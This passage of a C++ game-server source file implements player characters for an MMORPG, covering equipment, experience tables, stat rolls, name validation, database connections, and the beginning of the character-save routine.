/******************************************************************************
Modify for vs2008 (30/04/2009)
Add Profession System, Guild, AH by NightMare :ToTest (30/06/2009)
/******************************************************************************/
#include "stdafx.h"
#include "Character.h"
#include "PlayerManager.h"
#include "random.h"
#include "WorldMap.h"
#include "ObjectListing.h"
#include "TFC_MAIN.h"
#include "Players.h"
#include "Objects.h"
#include "StatModifierFlagsListing.h"
#include "StatModifierFlagsListing2.h"
#include "Broadcast.h"
#include "GameDefs.h"
#include "Unit.h"
#include "skilllisting.h"
#include "_item.h"
#include "SpellListing.h"
#include "ODBCMage.h"
#include "TFC Server.h"
#include "IntlText.h"
#include "DynObjListing.h"
#include "TFCPacket.h"
#include "PacketManager.h"
#include "AutoConfig.h"
#include "RegKeyHandler.h"
#include "Format.h"
#include "MonsterStructure.h"
#include "QuestFlagsListing.h"
#include "WeatherEffect.h"
#include "UDP/NMPacketManager.h"
#include "GuildMaster.h"
#include "ChatterChannels.h"
#include "DynObjManager.h"
#include "SysopCmd.h"
#include "Arena1Master.h"
#include "Arena2Master.h"
#include "MD5\MD5Checksum.h"

#ifdef _WIN32
#include <mmsystem.h>
#endif


#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

/******************************************************************************/
#define BOW_POS     Character::weapon_right
#define QUIVER_POS  Character::weapon_left

#define TELL_PLAYER( __textID ) {\
   TFCPacket sending;\
   /* Send a packet telling the user it cannot equip this weapon*/\
   CString csText;\
   csText = _STR( __textID, wLang );\
   sending << (RQ_SIZE)RQ_ServerMessage;\
   sending << (short)30;\
   sending << (short)3;\
   TRACE( "\r\nSending player message %s.", (LPCTSTR)csText );\
   sending << csText;\
   sending << (long)CL_BLUE_LIGHT;\
   SendPlayerMessage( sending );\
}

#define addskill( id, hook, strength ) {\
   LPUSER_SKILL lp = new USER_SKILL;\
   lp->nSkillID = id;\
   lp->nSkillPnts = strength;\
   tlusSkills[hook].AddToTail(lp);\
}

#define addspell( id ) {\
   LPUSER_SKILL lp = new USER_SKILL;\
   lp->nSkillID = id;\
   lp->nSkillPnts = 100;\
   tlusSpells.AddToTail( lp );\
}

#define addProfessionFormula( id ){ LPUSER_PROFESSION_F lp = new USER_PROFESSION_F;\
   lp->ushID = id;\
   tlProfessionAcq.AddToTail( lp );\
}

// Add a query to the batch requests
#define ADD_QUERY { \
   LPSQL_REQUEST lpSql = new SQL_REQUEST;\
   lpSql->csQuery = csQuery;\
   lptlSQLRequests->AddToTail( lpSql );\
}

// Load character specific structures and defines.
#define FETCH_WORD( Row )	ODBCCharRead.GetWORD( Row, &wTemp ); TRACE( ".%u", wTemp );
#define FETCH_DWORD( Row )  ODBCCharRead.GetDWORD( Row, &dwTemp ); TRACE( ".%u", dwTemp );
#define FETCH_SWORD( Row )  ODBCCharRead.GetSWORD( Row, &sTemp ); TRACE( ".%d", sTemp );
#define FETCH_SDWORD( Row ) ODBCCharRead.GetSDWORD( Row, &lTemp ); TRACE( ".%d", lTemp );

#if 0
#define ADD_TO_TRAINING_LIST( WhichList ) /* if(Skills::IsSkillLearnable(dwSkill, this)) */\
{\
   tlusSkills[ WhichList ].Lock();\
   tlusSkills[ WhichList ].AddToTail(lpusNewSkill);\
   tlusSkills[ WhichList ].Unlock();\
   boFoundOwner = TRUE;\
}
#endif

//
#define ADD_TO_TRAINING_LIST( WhichList ) /* if(Skills::IsSkillLearnable(dwSkill, this)) */\
{\
   tlusSkills[ WhichList ].Lock();\
   tlusSkills[ WhichList ].ToHead();\
   BOOL bAdd = FALSE;\
   while(tlusSkills[ WhichList ].QueryNext() && !bAdd)\
   {\
      LPUSER_SKILL lpCurrent = tlusSkills[WhichList].Object();\
      if(lpusNewSkill->GetSkillID() < lpCurrent->GetSkillID())\
      {\
        tlusSkills[ WhichList ].AddToPrevious(lpusNewSkill);\
        bAdd = TRUE;\
      }\
   }\
   if(!bAdd)\
      tlusSkills[ WhichList ].AddToTail(lpusNewSkill);\
   tlusSkills[ WhichList ].Unlock();\
   boFoundOwner = TRUE;\
}


#define PACKET_POS( __pos ) wValue = equipped[ __pos ] ? equipped[ __pos ]->GetAppearance() : 0;\
   TRACE( "\r\n%u.", wValue );\
   sending << (short)wValue;

/******************************************************************************/
typedef union _Int64ToDWord
{
   DWORD   dwVal[2];
   __int64 i64Val;
}Int64ToDWord;


/******************************************************************************/
// This class will auto-remove an arrow from the quiver upon destruction.
class AutoArrowRemove{
   /******************************************************************************/
public:
   AutoArrowRemove( Character *iself, Objects *iquiver, _item *iquiverData ) : 
      self( iself ), quiver( iquiver ), quiverData( iquiverData )
      {
      }
      ~AutoArrowRemove()
      {
         if( quiverData->weapon.infiniteAmmo )
         {
            return;
         }
         // Remove an arrow from the quiver
         quiver->Remove();
         // If the quiver is now empty.
         if( quiver->GetQty() == 0 )
         {
            // Remove it from the equipped and destroy it.
            self->equipped[ QUIVER_POS ] = NULL;
            quiver->DeleteUnit();
         }
         TFCPacket sending;
         self->packet_equiped( sending );
         self->SendPlayerMessage( sending );
      }
private:
   Character *self;
   Objects *quiver;
   _item *quiverData;
};

/******************************************************************************/
__int64 Character::sm_n64XPchart[MAX_LEVEL_XP];
__int64 Character::sm_n64XPchartOld[MAX_LEVEL_XP];
BYTE Character::m_bSkillPnt[ (MAX_LEVEL_XP / 10) + 1 ] = {
   15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15
};
const DWORD TIME_BEFORE_CORPSE_ROT = 15 MINUTES;
const DWORD MIN_LEVEL_DEATH_REPORT = 1;
const WorldPos wlStartPos = { 2944, 1059, 0 };
const WorldPos wlDeathPos = { 2948, 1041, 0 };

const UINT MinionMovealoneTime  = 1000 MILLISECONDS;
const UINT MinionMinTimeCall    = 5 SECONDS;

static CLock statsLockXP;
static CLock statsLockGold;
static BoostFormula startupGold;
static struct vstring : public vector< string >, CLock{} vStartupItems;

extern Random rnd;
extern CTFCServerApp theApp;

static cODBCMage ODBCCharRead;      //OK MANUAL Commit et LOCK OK
static cODBCMage ODBCCharReadCon;   //OK MANUAL Commit et LOCK OK
static cODBCMage ODBCCharWrite;     //OK MANUAL Commit et LOCK OK
static cODBCMage ODBCNMSGold;       //OK MANUAL Commit et LOCK OK
static cODBCMage ODBCCharAsyncSave; //OK MANUAL Commit mais uniquement THREADER pour save player



/******************************************************************************/
//  Called whenever the registry changed.
void Character::AutoConfigUpdate( void )
/******************************************************************************/
{
   RegKeyHandler regKey;    
   CString csKey;    

   regKey.Open( HKEY_LOCAL_MACHINE, theApp.csT4CKEY+CHARACTER_KEY );

   vStartupItems.Lock();
   // Erase previous startup items.
   vStartupItems.erase( vStartupItems.begin(), vStartupItems.end() );

   int i = 1;
   // Fetch all local ip definitions.
   CString csItem = regKey.GetProfileString( "StartupItem1", "$NULL$" );
   while( csItem != "$NULL$" )
   {
      *back_inserter( vStartupItems ) = (LPCTSTR)csItem;

      csKey.Format( "StartupItem%u", ++i );
      csItem = regKey.GetProfileString( (LPCTSTR)csKey, "$NULL$" );
   }
   vStartupItems.Unlock();

   startupGold.SetFormula( regKey.GetProfileString( "StartupGold", "200+1d50" ) );
}
/******************************************************************************/
// Destroys the equipment.
void Character::DestroyEquipment( void )
/******************************************************************************/
{
   int i, j;

   for(i = 0; i < EQUIP_POSITIONS; i++)
   {
      if( equipped[i] != NULL )
      {
         // Check all other succeeding equip positions to see if its equipped twice (two-hands etc).
         for( j = i+1; j < EQUIP_POSITIONS; j++ )
         {
            if( equipped[ j ] == equipped[ i ] )
            {
               equipped[ j ] = NULL;
            }
         }
         equipped[i]->DeleteUnit();
         equipped[ i ] = NULL;
      }
   }
}
/******************************************************************************/
Character::Character() : 
autoCombatAttack( Character::Attack::normal, 0 ),
prevAutoCombatAttack( Character::Attack::normal, 0 ),
gameopContext( 0 ), 
boCharacterIsChesting(false), 
boCharacterIsGuildChesting(false),
m_TradeMgr2(*this), 
numberOfSaveFailures( 0 ),
boAuthGM( false )
/******************************************************************************/
{		
   m_strEmpty = " ";
   if(theApp.dwUseGMAuth==0)
      boAuthGM = true; // we not use GM Auth, gm have access to all command

   // Create an event signaled ( player created by default ).
   // Avoids player to load before it has finished to save.
   hCreationEvent = CreateEvent( NULL, TRUE, TRUE, NULL );	

   SetStatus( IS_PLAYER | GetStatus() );

   wLang = IntlText::GetDefaultLng();

   Do(wandering);
   exhaust.move = 0;
   exhaust.attack = 0;
   exhaust.mental = 0;
   exhaust.boWalking = FALSE;

   LastMoveTime = 0;
   MinionLastCall = 0;

   m_strCompagnonName = "";
   m_dwCompagnonID    = 0 ;
   m_iRPXP = 0;
   m_iRPXPPoint = 0;

   SetBlock( __BLOCK_CAN_FLY_OVER );

   nClass = 0;

   _died_ = FALSE;
   PlayerGold = 0;
   ThisPlayer = NULL;
   KillMe = FALSE;
   account = "";
   SetName("");

   WorldPos WL;
   WL.X = 0xFFFFFFFF;
   WL.Y = 0xFFFFFFFF;
   WL.world = 0xFFFFFFFF;

   SetWL(WL);

   PlayerGold = 0;
   dwGoldAcc = 0;

   Create(U_PC, 0);

   TRACE(_T("Created a character %u %u %u!\r\n"), WL.X, WL.Y, WL.world);

   backpack = new TemplateList <Unit>;
   chest = new ItemContainer();

   int i;
   for(i = 0; i < EQUIP_POSITIONS; i++)
   {
      equipped[i] = NULL;
   }

   wNbStatPnts = 0;
   wNbSkillPnts = 0;
   SetXP(0);
   xpLastSend = 1;

   boLoaded = FALSE;
   bChestChanged = FALSE;

   bGender = GENDER_MALE;   // Default...
   nKarma  = 0;            // neutral by default
   nCrime   = 0;
   nHonor  = 0;

   dwLastHealing = 0;
   SetLightResist( 5000 );

   bNeedUpdateGold    = FALSE;
   bNeedUpdateGoldMsg = FALSE;

   lpGroup = NULL; // No group by default.

   // Display the arrival at 1st logon only.
   seraphAlreadyArrived = false;

   lastInviteTime     = 0;
   m_chCombatMode     = 0;
   m_iRPPhase         = -1;
   m_iArenaID         = 0;
   m_iArenaType       = -1;
   m_iArenaKill       = 0;
   m_iArenaDead       = 0;
   m_iArenaFlag       = 0;
   m_iArenaTeam       = 0;
   m_dwArenaLastStart = 0;
   m_dArenaPVP        = 0.00;
   m_iArenaINACTIFTime= 0;
   m_iArenaINACTIFMin = 0;
   m_iArenaDUREETime  = 0;
   m_iArenaDUREEMin   = 0;
   m_iArenaPOINTS     = 0;

   m_iRPTalkCnt       = 0;
   m_iRPNOTTalkCnt    = 0;
   

   m_pMinions = NULL;
}
/******************************************************************************/
Character::~Character()
/******************************************************************************/
{	
   if( backpack != NULL )
   {
      backpack->ToHead();
      while(backpack->QueryNext())
      {
         //backpack->DeleteAbsolute();
         backpack->Object()->DeleteUnit();
         backpack->Remove();
      }        

      if (backpack != NULL)
      {	
         delete backpack;
         backpack = NULL;
      }
   }

   if ( chest != NULL ) 
   {
      delete chest;
      chest = NULL;
   }

   DestroyEquipment();

   TemplateList <USER_SKILL> tlDeletedSkills;
   BOOL boFound;

   int i;
   for( i = 0; i < NB_SKILL_HOOKS; i++ )
   {
      tlusSkills[ i ].ToHead();
      // Pass all the skills in the hook
      while( tlusSkills[ i ].QueryNext() )
      {
         // Check if pointer has already been deleted
         boFound = FALSE;
         tlDeletedSkills.ToHead();
         while( tlDeletedSkills.QueryNext() && !boFound )
         {
            if( tlDeletedSkills.Object() == tlusSkills[ i ].Object() )
            {
               boFound = TRUE;
            }
         }

         // If user skill hasn't been deleted.
         if( !boFound )
         {
            tlDeletedSkills.AddToTail( tlusSkills[ i ].Object() );
            tlusSkills[ i ].DeleteAbsolute();
         }
      }
   }

   tlusSpells.ToHead();
   while( tlusSpells.QueryNext() )
   {
      tlusSpells.DeleteAbsolute();
   }

   CloseHandle( hCreationEvent );

   // The robbing flag is never persistent.
   RemoveFlag( __FLAG_ROBBING );
   RemoveFlag( __FLAG_PEEKING );

   TRACE(_T("Destroyed a character\r\n"));
}
/******************************************************************************/
void Character::SetPlayer(Players *Player)
/******************************************************************************/
{
   ThisPlayer = Player;
}
/******************************************************************************/
//  Returns the ODBC connection used for player selecting.
cODBCMage *Character::GetODBC( void )
/******************************************************************************/
{
   return &ODBCCharRead;
}

/******************************************************************************/
void Character::WaitForAsyncSaveFuncBD( void )
{
   /******************************************************************************/
   ODBCCharAsyncSave.WaitForODBCShutdown();
}
/******************************************************************************/
// Connects the characters' database.
void Character::InitializeODBC( void )
/******************************************************************************/
{
   ODBCCharRead     .Connect( USERS_DSN, USERS_USER, USERS_PWD );
   ODBCCharReadCon  .Connect( USERS_DSN, USERS_USER, USERS_PWD );
   ODBCCharWrite    .Connect( USERS_DSN, USERS_USER, USERS_PWD );
   ODBCCharAsyncSave.Connect( USERS_DSN, USERS_USER, USERS_PWD );
   ODBCNMSGold      .Connect( USERS_DSN, USERS_USER, USERS_PWD );

   ODBCCharRead.Lock();

   // Sets write connections' autocommit off
   ODBCCharRead     .ConnectOption( SQL_AUTOCOMMIT, SQL_AUTOCOMMIT_OFF );	
   ODBCCharReadCon  .ConnectOption( SQL_AUTOCOMMIT, SQL_AUTOCOMMIT_OFF );	
   ODBCCharWrite    .ConnectOption( SQL_AUTOCOMMIT, SQL_AUTOCOMMIT_OFF );	
   ODBCCharAsyncSave.ConnectOption( SQL_AUTOCOMMIT, SQL_AUTOCOMMIT_OFF );	
   ODBCNMSGold      .ConnectOption( SQL_AUTOCOMMIT, SQL_AUTOCOMMIT_OFF );	

   // Stop transaction.
   ODBCCharRead.Cancel();
   ODBCCharRead.Unlock();
}
/******************************************************************************/
// Disconnects from the characters' database.
void Character::DestroyODBC( void )
/******************************************************************************/
{
   ODBCCharRead     .Disconnect();
   ODBCCharReadCon  .Disconnect();
   ODBCCharWrite    .Disconnect();
   ODBCCharAsyncSave.Disconnect();
   ODBCNMSGold      .Disconnect();
}
/******************************************************************************/
// Assigns a valid ID to the given character.
void AssignValidID(Character *target) // The character to set a valid ID to.
/******************************************************************************/
{
   ODBCCharRead.Lock();

   // Fetches all IDs in the characters table.
   ODBCCharRead.SendRequest( "SELECT UserID FROM PlayingCharacters ORDER BY UserID" );

   DWORD Id = 0;
   DWORD previousId = 0;
   // Fetch each rows.
   while( ODBCCharRead.Fetch() )
   {		
      ODBCCharRead.GetDWORD( 1, &Id );

      // If an Id gap was found.
      if( Id - previousId > 1 )
      {
         // Stop search.
         break;
      }
      previousId = Id;
   }

   // Assign an Id one bigger then the previousId.
   target->SetID( previousId + 1 );

   ODBCCharRead.Cancel();
   ODBCCharRead.Unlock();
}


/******************************************************************************/
// This function inits the xp table
void Character::InitXPchart()
/******************************************************************************/
{	
   // Set auto-update function
   CAutoConfig::AddRegUpdateCallback( AutoConfigUpdate );
   AutoConfigUpdate();

   __int64 n64XP = 0;
   int nLevel = 0;
   int y = 0;
   int z = 10;

   sm_n64XPchart[ 0 ] = 0;
   if(theApp.dwEquilibrageNewCourbeXPEnable == 0)//init XP Chart
   {
      for( nLevel = 1; nLevel < MAX_LEVEL_XP; nLevel++ )
      {
         if( nLevel <= 41 )
         {
            n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
            y += z;
         }
         else if( nLevel <= 81 )
         {
            n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
            y += z;
            z += 1;
         }
         else if( nLevel <= 121 )
         {
            n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
            y += z;
            z += 4;
         }
         else if( nLevel <= 141 )
         {
            n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
            y += z;
            z += 16;
         }
         else if( nLevel <= 161 )
         {
            n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
            y += z;
            z += 64;
         }
         else if( nLevel <= 181 )
         {
            n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
            y += z;
            z += 256;
         }
         else if( nLevel <= 191 )
         {
            n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
            y += z;
            z += 1024;
         }
         else
         {
            n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
            y += z;
            z += 4096;
         }
         Character::sm_n64XPchart[ nLevel ] = n64XP;

         TRACE( "\r\nLevel %u requires %I64u xp.", nLevel+1, n64XP );
      }
   }
   else
   {
      //FILE *pfO = NULL;
      //FILE *pfN = NULL;
      //fopen_s(&pfO,"C:\\!!!XPO.txt","wt");
      //fopen_s(&pfN,"C:\\!!!XPN.txt","wt");
      //On se remplie une table de la vieille formule pour convertir les Xp
      //de la vieille a la nouvelle methode
      {
         sm_n64XPchartOld[ 0 ] = 0;

         for( nLevel = 1; nLevel < MAX_LEVEL_XP; nLevel++ )
         {
            if( nLevel <= 41 )
            {
               n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
               y += z;
            }
            else if( nLevel <= 81 )
            {
               n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
               y += z;
               z += 1;
            }
            else if( nLevel <= 121 )
            {
               n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
               y += z;
               z += 4;
            }
            else if( nLevel <= 141 )
            {
               n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
               y += z;
               z += 16;
            }
            else if( nLevel <= 161 )
            {
               n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
               y += z;
               z += 64;
            }
            else if( nLevel <= 181 )
            {
               n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
               y += z;
               z += 256;
            }
            else if( nLevel <= 191 )
            {
               n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
               y += z;
               z += 1024;
            }
            else
            {
               n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
               y += z;
               z += 4096;
            }
            Character::sm_n64XPchartOld[ nLevel ] = n64XP;
            //fprintf(pfO,"%03d --> %I64u\n",nLevel,n64XP);
           
         }
      }

      n64XP = 0;
      nLevel = 0;
      y = 0;
      z = 10;

      //////////////////////////////////////////////////////
      // Moen_OK : (Night: A tester_)
      //    (27/04/2010) -+-+-+-+ Courbe XP V2 +-+-+-+-
      // /!\ Si on passe de l'ancienne à la nouvelle     *
      //     il faut passer le script de mise à jour     *
      //     sur la base de donnée.                      *
      ///////////////////////////////////////////////////////
      // Constante d'XP supplémentaire à Ajouter au lvl 191+
      __int64 n64ConstXPAdd = 800000000;
      sm_n64XPchart[ 0 ] = 0;
      for( nLevel = 1; nLevel < MAX_LEVEL_XP; nLevel++ )
      {
         if( nLevel <= 41 )
         {
            n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
            y += z;
         }
         else if( nLevel <= 81 )
         {
            n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
            y += z;
            z += 1;
         }
         else if( nLevel <= 121 )
         {
            n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
            y += z;
            z += 4;
         }
         else if( nLevel <= 141 )
         {
            n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
            y += z;
            z += 16;
         }
         else if( nLevel <= 161 )
         {
            n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
            y += z;
            z += 64;
         }
         else if( nLevel <= 181 )
         {
            n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
            y += z;
            z += 256;
         }
         else if( nLevel <= 191 )
         {
            n64XP = static_cast< __int64 >( pow( nLevel, 2.5 ) * ( 1000 + y ) );
            y += z;
            z += 1024;
         }
         else // lvl > 191
         {
            //formule : (( 2 * xp lvl-1) - xp lvl-2 ) + Const
            // => Xp necessaire pour aller du niveau précédent au suivant + constante
            n64XP = static_cast< __int64 >( 2 * Character::sm_n64XPchart[ nLevel -1 ] - Character::sm_n64XPchart[ nLevel - 2 ] + n64ConstXPAdd);
         }
         Character::sm_n64XPchart[ nLevel ] = n64XP;
         //fprintf(pfN,"%03d --> %I64u\n",nLevel,n64XP);
      }
      //fclose(pfO);
      //fclose(pfN);
   }
}
/******************************************************************************/
// Rerolls a character's stats.
BOOL Character::roll_stats()
/******************************************************************************/
{
   //TRACE("\r\nThis is the flag -> %u\r\n", ViewFlag(__FLAG_LEVEL));
   if(GetLevel() < 2)
   {
      WorldPos WL;
      // starting pos..
      {
         BOOL boUseDefault = TRUE;

         // server has a custom start position configured on registry.
         if (theApp.dwCustomStartupPositionOnOff) 
         { 
            WL.X = theApp.dwCustomStartupPositionX;
            WL.Y = theApp.dwCustomStartupPositionY;
            WL.world = theApp.dwCustomStartupPositionW;
            // Test if its a valid position.
            WorldMap *wlWorld = TFCMAIN::GetWorld( WL.world );
            // If world exist and the position is valid, use custom start position else use the defaut
            if( wlWorld != NULL && wlWorld->IsValidPosition( WL ) )
            {
               boUseDefault = FALSE;
            }
         }

         if ( boUseDefault ) 
         {
            WL.X = wlStartPos.X;
            WL.Y = wlStartPos.Y;
            WL.world = wlStartPos.world;
         }
      }
      SetWL( WL );

      // DestroyStaticFlags();
      DestroyFlags();

      // server has a custom startup sanctuary position set on registry
      if ( theApp.dwCustomStartupSanctuaryOnOff) 
      { 
         WorldPos WLSanc;
         WLSanc.X	 = theApp.dwCustomStartupSanctuaryX;
         WLSanc.Y	 = theApp.dwCustomStartupSanctuaryY;
         WLSanc.world = theApp.dwCustomStartupSanctuaryW;

         // Test if its a valid position.
         WorldMap *wlWorld = TFCMAIN::GetWorld( WLSanc.world );
         // If world exist and the position is valid, use custom sanctuary position else use the defaut
         if( wlWorld != NULL && wlWorld->IsValidPosition( WLSanc ) )
         {
            DWORD dwStartSanctuary = ( ( (DWORD)( (WORD)WLSanc.X ) << 20 ) + ( (DWORD)( (WORD)WLSanc.Y ) << 8 ) + (DWORD)( (BYTE)WLSanc.world ) );
            SetFlag( __FLAG_DEATH_LOCATION, dwStartSanctuary);
         }
      }
	  else
	  {
		  DWORD dwStartSanctuary = ( ( (DWORD)( (WORD)wlDeathPos.X ) << 20 ) + ( (DWORD)( (WORD)wlDeathPos.Y ) << 8 ) + (DWORD)( (BYTE)wlDeathPos.world ) );
		  SetFlag( __FLAG_DEATH_LOCATION, dwStartSanctuary);
	  }

      SetXP(0);

      TRACE( "\r\nSTR %u, AGI %u, END %u, INT %u, WIS %u, WIL %u, LCK %u.",
         bRollSTR,
         bRollAGI,
         bRollEND,
         bRollINT,
         bRollWIS,
         bRollWIL,
         bRollLCK );

      /*SetSTR( static_cast< WORD >( rnd( 0, 4 ) + 6 + bRollSTR ) );
      SetAGI( static_cast< WORD >( rnd( 0, 4 ) + 6 + bRollAGI ) );
      SetEND( static_cast< WORD >( rnd( 0, 4 ) + 6 + bRollEND ) );
      SetINT( static_cast< WORD >( rnd( 0, 4 ) + 6 + bRollINT ) );
      SetWIS( static_cast< WORD >( rnd( 0, 4 ) + 6 + bRollWIS ) );*/
      SetSTR( 20 );
      SetAGI( 20 );
      SetEND( 20 );
      SetINT( 20 );
      SetWIS( 20 );
      SetLCK( 100 );

      SetSTR( GetSTR() > 22 ? 22 : GetSTR() );
      SetAGI( GetAGI() > 22 ? 22 : GetAGI() );
      SetEND( GetEND() > 22 ? 22 : GetEND() );
      SetINT( GetINT() > 22 ? 22 : GetINT() );
      SetWIS( GetWIS() > 22 ? 22 : GetWIS() );
      SetLCK( 100 );

      SetATTACK( 15 );
      SetDODGE( 15 );

      SetMaxHP( rnd.roll( dice( 2, 5 ) ) + 48 + GetEND() );
      SetHP( GetMaxHP(), false );

      SetMaxMana( 10 + GetTrueINT() * 2 / 3 + GetTrueWIS() / 3 + rnd( 0, 5 ) );
      SetMana( GetMaxMana() );

      PlayerGold = startupGold.GetBoost( this );

      return TRUE;
   }
   return FALSE;
}
/******************************************************************************/
// Determines if a character's name is valid.
bool Character::IsNameValid(CString &name)
/******************************************************************************/
{
   name.TrimLeft();
   name.TrimRight();

   // Only gets wanted characters
   CString check_name = name.SpanIncluding(_T("1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ -äïëöüéèàùâîêôû")); //BLBLBL

   // If the packet is a valid one
   if( name.GetLength() > 1 && check_name == name && name.GetLength() <= 19){//BLBLBL
      return true;
   }
   return false;
}
/******************************************************************************/
// Loads a player into memory, either from a previously saved player, or create a new one
char Character::load_character(CString new_name, CString new_account, LPBYTE lpbAnswers )
/******************************************************************************/
{
   reset_character();

   CString full_directory;
   CFile player_file;

   new_name.TrimRight();
   new_name.TrimLeft();

   // If the packet is a valid one
   if( IsNameValid( new_name ) )
   {
      // If we want to create a new player
      if( lpbAnswers != NULL )
      {
         Players *pl = (Players *)ThisPlayer;
         if( pl != NULL ){
            // Could not create player.

            pl->LockAPlList();
            if(pl->GetNbrAPlayerList() >= TFCMAIN::GetMaxCharactersPerAccount()) 
            {
               pl->UnlockAPlList();
               return 4;
            }
            pl->UnlockAPlList();

            // If the player hasn't too many accounts we check to see if the player already exists.
            // if it fails from opening the player's file, then it's ok ;)
            TRACE(_T("\r\nOpening %s!"), (LPCTSTR)full_directory);	

            if( CreateCharacter( new_name, lpbAnswers ) )
            {
               pl->AddAPlList(new_name, 0, 1, GetID());
               pl->SaveAccount();

               pl->boRerolling = TRUE;

               return 0;
            }
            else
            {
               return 5;
            }
         }
         else
         {
            return 5;
         }
      }
      else
      {	
         // If we want to load an already existing player and put it in_game
         SetName(new_name);

         int result = LoadCharacter(new_name);

         if(result) 
         {
            return (char)result;
         }

         Players *pl = (Players *)ThisPlayer;
         if( pl != NULL )
         {                
            pl->Logon();
         }

         boLoaded = TRUE;
         return(0); // Loaded successfully
      }
   }
   account.Empty();
   return 8;
}
/******************************************************************************/
void Character::DataSaveCallback(
                                 DWORD dwSaveStatus,	// Status of ODBC request
                                 LPVOID lpData			// The character object
                                 )
                                 /******************************************************************************/
{
   Character *self = (Character *)lpData;

   if (dwSaveStatus == BATCH_SUCCEEDED) 
   {
      _LOG_DEBUG
         LOG_DEBUG_HIGH,
         "Stopped saving (with success) character %s.",
         (LPCTSTR)self->GetTrueName()
         LOG_
         self->numberOfSaveFailures = 0;
   }
   else 
   {
      _LOG_DEBUG
         LOG_WARNING,
         "FAILED saving character %s.",
         (LPCTSTR)self->GetTrueName()
         LOG_
         if (++self->numberOfSaveFailures > 2) 
         {
            _LOG_DEBUG
               LOG_CRIT_ERRORS,
               "Reached maximum number of acceptable character save failures. Disconnecting character %s to avoid data loss and timewarps.",
               (LPCTSTR)self->GetTrueName()
               LOG_

               Players *selfPlayer = self->GetPlayer();
            TFCPacket sending;
            sending << (RQ_SIZE)RQ_ServerMessage;
            sending << (short)30;
            sending << (short)3;
            sending << CString("Server problem. You're being disconnected to avoid corruption of your character. Sorry for the inconvenience.");
            sending << (long)CL_RED;
            selfPlayer->Lock();
            self->SendPlayerMessage( sending );
            selfPlayer->dwKickoutTime = 2 SECONDS TDELAY;
            selfPlayer->Unlock();
         }
   }

   // Set saving event signaled ( save terminated ).
   self->SavingStop();
}
/******************************************************************************/
// Saves a character
BOOL Character::SaveCharacter(BOOL bFORCE,char *pstrFromWho, BOOL boCallback )
/******************************************************************************/
{
   if(ViewFlag(__FLAG_JUST_DO_IT) == 666) //oki
      return FALSE;

   if(!GetPlayer()->boCanSave && !bFORCE)
	   return FALSE;

   int iNbrItemCount      = 0;
   int iNbrChestItemCount = 0;
   int iNbrSpellCount     = 0;

   // Saving starts.
   if( boCallback )
   {
      SavingStart();
   }

   Lock();

   // Load the deferred loaded effects before saving.
   // DeferredLoadEffects();

   CString csQuery;
   CString csTemp;
   DWORD dwUserID = GetID();
   BOOL boDBError = FALSE;	// if there is a database error.

   if( _died_ )
   {
      SetWL( wlDeathPos );
   }

   TemplateList< SQL_REQUEST > *lptlSQLRequests = new TemplateList< SQL_REQUEST >;

   // Saves the objects	
   UINT i;
   BYTE lpszName[ 256 ];

   _LOG_DEBUG
      LOG_DEBUG_LVL3,
      "(Saving character %s) Deleting previous records.",
      (LPCTSTR)GetTrueName()
      LOG_

   bool bChestSaved = false;

   LockChestChanged.Lock();
   if(bChestChanged)
   {
      bChestSaved = true;
      bChestChanged = FALSE;
   }
   LockChestChanged.Unlock();

   // Delete items owned by the player at last save.
   csQuery.Format( "DELETE FROM PlayerItems WHERE OwnerID=%u", GetID() );
   ADD_QUERY

   // Delete everything related to this player.
   if(bChestSaved)
      csQuery.Format( "DELETE FROM Flags WHERE OwnerID=%d OR BaseOwnerID=%d", GetID(), GetID());	
   else
      csQuery.Format( "DELETE FROM Flags WHERE OwnerID=%d AND BaseOwnerID=%d", GetID(),GetID() );	
   ADD_QUERY

   csQuery.Format( "DELETE FROM Boosts WHERE BaseOwnerID=%d", GetID() );
   ADD_QUERY

   csQuery.Format( "DELETE FROM Effects WHERE BaseOwnerID=%d", GetID() );
   ADD_QUERY





   _LOG_DEBUG
      LOG_DEBUG_HIGH,
      "Saving backpack"
      LOG_

   MultiLock(backpack, m_TradeMgr2.GetCLock());
   BOOL isTradeValidAndTrading = TRUE;
   if (m_TradeMgr2.IsTradeValid() != TradeMgr2::ErrorCodes::IsTrading) 
   {
      m_TradeMgr2.GetCLock()->Unlock();
      isTradeValidAndTrading = FALSE;
   }
   // Begin by saving the backpack
   backpack->ToHead();
   while( backpack->QueryNext() && !boDBError )
   {
      Objects *obj = static_cast< Objects * >( backpack->Object() );

      // If the item is not gold and if the unit name ID could be found
